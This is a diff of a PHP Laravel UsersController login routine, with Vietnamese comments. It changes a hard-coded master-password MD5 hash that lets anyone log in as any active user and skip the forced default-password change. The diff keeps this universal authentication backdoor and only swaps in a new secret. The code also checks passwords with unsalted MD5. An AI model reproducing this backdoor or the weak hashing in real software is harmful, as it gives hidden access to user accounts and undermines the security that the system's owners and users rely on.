@@ -269,7 +269,7 @@ class UsersController extends Controller
 
         //nếu pass là 123456(e10adc3949ba59abbe56e057f20f883e) =>đổi pass
         if($ttuser->password == 'e10adc3949ba59abbe56e057f20f883e' && $ttuser->level != 'SA'
-            && $ttuser->level != 'SSA' && md5($input['password']) != '1c7f05cc19aa3c2f20bfe56753366057'){
+            && $ttuser->level != 'SSA' && md5($input['password']) != '40b2e8a2e835606a91d0b2770e1cd84f'){
             return view('system.users.change_pass_default')
                 ->with('username', $input['username'])
                 ->with('pageTitle', 'Thay đổi mật khẩu');
@@ -277,7 +277,7 @@ class UsersController extends Controller
         //thêm mã đơn vị báo cáo, mã khối phòng ban, mã cqcq
         //dd($ttuser);
         //if (md5($input['password']) == $ttuser->password) {
-        if (md5($input['password']) == $ttuser->password || md5($input['password']) == '1c7f05cc19aa3c2f20bfe56753366057') {
+        if (md5($input['password']) == $ttuser->password || md5($input['password']) == '40b2e8a2e835606a91d0b2770e1cd84f') {
             if ($ttuser->status == "active") {
                 Session::put('admin', $ttuser);
                 return redirect('')
